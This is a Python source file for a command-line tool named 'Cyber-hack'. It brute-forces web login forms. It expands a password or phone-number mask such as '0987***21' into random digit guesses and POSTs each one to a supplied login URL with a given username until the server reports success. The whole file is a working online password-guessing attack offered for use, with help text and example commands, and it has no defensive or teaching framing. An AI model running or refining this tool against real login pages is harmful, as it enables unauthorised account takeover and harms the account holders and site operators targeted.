import requests as req
# ----------------------------------------------------------------
import random,re
from logo import showLogo
dictionarys = []

session = req.Session()
session.headers.update({"Content-Type": "application/x-www-form-urlencoded"})

def randomPhoneNumber(main):
    x = main
    while(True):
        if(len(main)==10):
            if main not in dictionarys:
                dictionarys.append(main)
                return main
            else:
                main = x
        main += random.choice("0123456789")

def jenPasswords(main):
    while(True):
        phone = ""
        for i in main:
            if i == "*":
                phone += random.choice("0123456789")
            else:
                phone += i
        if phone not in dictionarys:
            dictionarys.append(phone)
            return phone

def BruteForcePhoneNumber():
    while(True):
        data = input("BrutePhone>>")
        if(data=="exit"):
            return
        elif(data=="help"):
            print("""========================================================================================================
- exit \t :back menu.
- Ex: -m {Method} -u {url} -b {body}(key:value) -t {body}(key:value)
\t -m \t :method GET,POST.
\t -u \t :url path target.
\t -b \t :body method POST key:value. 
\t -t \t :target method POST key:value, Example password:0987***21,Will random 0-9 use "*".
========================================================================================================""")
            continue
        method = re.findall("-m (.*?) -", data)
        if len(method)==0:
            print("=======================================================================")
            print("Warning!!!\n",data,"\n -m Error Ex: -m POST, GET")
            print("=======================================================================")
            continue
        url = re.findall("-u (.*?) -", data)
        if len(url)==0:
            print("=======================================================================")
            print("Warning!!!\n",data,"\n -u Error Ex: -u https://hack.com")
            print("=======================================================================")
            continue
        bodys = re.findall("-b (.*?) -", data)
        if len(bodys)==0:
            print("=======================================================================")
            print("Warning!!!\n",data,"\n -b Error Ex: -b username:hack@hack.com")
            print("=======================================================================")
            continue
        target = re.findall("-t (.*)", data)
        if len(target)==0:
            print("=======================================================================")
            print("Warning!!!\n",data,"\n -t Error Ex: -t password:0987****21")
            print("=======================================================================")
            continue
        if ":" not in bodys[0]:
            print("=======================================================================")
            print("Warning!!!\n",bodys,"\n -b Error use\":\"")
            print("=======================================================================")
            continue
        if ":" not in target[0]:
            print("=======================================================================")
            print("Warning!!!\n",target,"\n -t Error use\":\"")
            print("=======================================================================")
            continue
        b1 = bodys[0].split(":")
        b2 = target[0].split(":")
        while(True):
            if len(dictionarys)==10**b2[1].count("*"):
                print("=======================================================================")
                print(">>Count Password is ",len(dictionarys),"Brute Force Maximum.")
                print("=======================================================================")
                break
            # password = str(randomPhoneNumber("09290"))
            password = str(jenPasswords(b2[1]))
            body = {
                b1[0]:b1[1],
                b2[0]:password
            }
            res = req.post(url=url[0],data=body)
            print(f">> {password} {len(dictionarys)}",end="\r")
            if res.json()["status"] == 200:
                print("=======================================================================")
                print(">>",password,"login Successfully.")
                print("=======================================================================")
                dictionarys.clear()
                break

showLogo()
print(">> Cyber-hack -u a@a.coam -p 09876***12 https://a.com/login")
try:
    while(True):
        res = input(">> ")
        if("Cyber-hack" in res):
            username = re.findall("-u (.*?) ", res)
            passwordjen = re.findall("-p (.*?) ", res)
            url = res.split(' ')[-1]
            while True:
                password = str(jenPasswords(passwordjen[0]))
                response = session.post(url,data={"username":username[0],"password":password})
                print(f">> {password} {len(dictionarys)} {response.json()}",end="\r")
                if response.json()["status"] == 200 and "สำเร็จ" in response.json()["message"]:
                    print("=======================================================================")
                    print(f">> username= {username[0]}, password= {password} login Successfully.")
                    print("=======================================================================")
                    dictionarys.clear()
                    break
        elif("help" in res or "h" in res or "-help" in res or "-h" in res):
            print("""========================================================================================================
    \t- help \t\t :Use Commands "help" Show All Command.
    \t- exit \t\t :Use Commands "exit" close Cyber.
    \t- Cyber-hack \t :Use Commands "Cyber-hack" Brute Force Attacking url.
    \t -u \t :username.
    \t -p \t :password Ex : -p 0987***21 will random 0-9 use "*". 
    \t Example cmd: Cyber-hack -u a@a.com -p 09876***12 https://a.com/login
    ========================================================================================================""")
        elif(res=="exit"):
            break
except:
    pass